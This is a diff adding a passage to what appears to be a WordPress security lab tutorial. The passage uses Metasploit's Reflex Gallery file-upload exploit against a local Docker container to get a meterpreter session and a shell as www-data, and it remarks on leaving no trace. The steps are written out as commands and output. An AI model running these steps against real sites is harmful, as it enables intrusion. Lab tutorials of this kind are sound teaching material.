@@ -70,6 +70,7 @@ configuration via docker. While this is fine for read-only operations, we need
 something a bit more specific than localhost to deliver a payload. Let's find 
 the IP to use instead by running `ifconfig` and looking for the IP associated 
 with eth0:
+
 ```
 /* for codepath */
 $ ifconfig
@@ -141,7 +142,155 @@ MSF runs faster with it.
 db_status
 
 db_rebuild_cache
+
 ```
 Now we are ready.
+
+## Milestone 4: Pwnage
+In MSF, start by searching the exploit database for something related to the 
+plugin affected by the vulnerability. You could search on several different 
+terms to find something, but in this case, the plugin has an unusual word in 
+its name, "Reflex"
+
+Search in MSF:
+```
+msf > search Reflex
+[!] Module database cache not built yet, using slow search
+
+Matching Modules
+================
+
+   Name                                              Disclosure Date  Rank       Description
+   ----                                              ---------------  ----       -----------
+   exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Wordpress Reflex Gallery Upload Vulnerability
+
+```
+
+
+Well, that sure looks handy. It's even ranked excellent, which should suggest
+to you that not all of these tools are created equal. Some work better than
+others; some don't work at all. In fact, what follows may not work perfectly
+for you, so don't be too surprised if it doesn't go swimmingly. These are
+hacks, after all: user-supported code and scripts whose primary purpose is to
+compromise systems, so robustness isn't exactly a guarantee. Give it a shot,
+but be prepared for some possible difficulty ahead.
+
+To command to use the exploit is unsurprisingly called `use` and takes the
+exploit's name as an argument. Once loaded, the command prompt changes again,
+and you can run the `info` command.
+```
+msf > use exploit/unix/webapp/wp_reflexgallery_file_upload
+msf exploit(wp_reflexgallery_file_upload) > info
+```
+
+Notice the output lists the affected version and some options we'll need to set:
+```
+Available targets:
+  Id  Name
+  --  ----
+  0   Reflex Gallery 3.1.3
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOST                       yes       The target address
+  RPORT      80               yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /                yes       The base path to the wordpress application
+  VHOST                       no        HTTP server virtual host
+
+Payload information:
+
+Description:
+  This module exploits an arbitrary PHP code upload in the WordPress
+  Reflex Gallery version 3.1.3. The vulnerability allows for arbitrary
+  file upload and remote code execution.
+
+```
+
+Use the `set` command to specify RHOST and RPORT accordingly. If your blog isn't
+hosted at the root (/), you could additionally pass in the path by setting
+TARGETURI (but the Docker setup should work with the default).
+
+```
+msf exploit(wp_reflexgallery_file_upload) > set RHOST 172.18.0.1
+RHOST => localhost
+msf exploit(wp_reflexgallery_file_upload) > set RPORT 8000
+RPORT => 8000
+```
+You can probably guess the command used to run the exploit (it'll take a minute to run):
+```
+msf exploit(wp_reflexgallery_file_upload) > exploit
+
+meterpreter >
+
+```
+Notice the command prompt changed to `meterpreter >`. The meterpreter payload
+(GyWbjRCJnRSwE.php) was uploaded, executed, then deleted (just like campers,
+hackers should leave no trace), and now we have a connection to the target
+machine. Run the `shell` command when you see the `meterpreter >` prompt to load a
+new shell:
+```
+meterpreter > shell
+Process 63 created.
+Channel 0 created.
+```
+A shell within a shell within a shell. But this shell is different; this shell
+is running on the WordPress container. In case it's not clear, you really
+shouldn't be able to do that. Notice the new shell spawned by Meterpreter
+doesn't bother with command prompts at all, so it might just look like
+nothing's happening after the process and channel are created. Try running some
+commands, like `whoami` and `pwd`:
+```
+whoami
+www-data
+
+pwd
+/var....
+
+echo $HOSTNAME
+
+exit
+```
+Lines 2, 4, and 6 in above snippet are output. It's a low-fi shell, and
+somewhat limited, but it works, and it's enough to compromise the whole
+machine. We can see we're shell'd in as the www-data user and presently in one
+of the wordpress upload directories, which is where the malicious PHP payload
+was delivered. We can also see the HOSTNAME matches the docker container id.
+
+The exit command above gets us back to the meterpreter > prompt,
+which has fewer but more useable commands than the shell. For instance, we can
+poke around with pwd, cd, ls, and cat:
+```
+meterpreter > pwd
+/var/www/html/wp-content/uploads/2017/03
+meterpreter > cd ../../..
+meterpreter > pwd
+/var/www/html/wp-content
+meterpreter > ls
+Listing: /var/www/html/wp-content
+=================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  29    fil   2017-03-18 19:01:59 +0000  index.php
+40755/rwxr-xr-x   4096  dir   2017-03-18 01:13:31 +0000  plugins
+40755/rwxr-xr-x   4096  dir   2017-03-16 20:06:21 +0000  themes
+40755/rwxr-xr-x   4096  dir   2017-03-18 01:13:31 +0000  upgrade
+40755/rwxr-xr-x   4096  dir   2017-03-18 01:13:31 +0000  uploads
+
+meterpreter > cat index.php
+<?php
+// Silence is golden.
+```
+
+
+
+
+
+
+
+
 
 
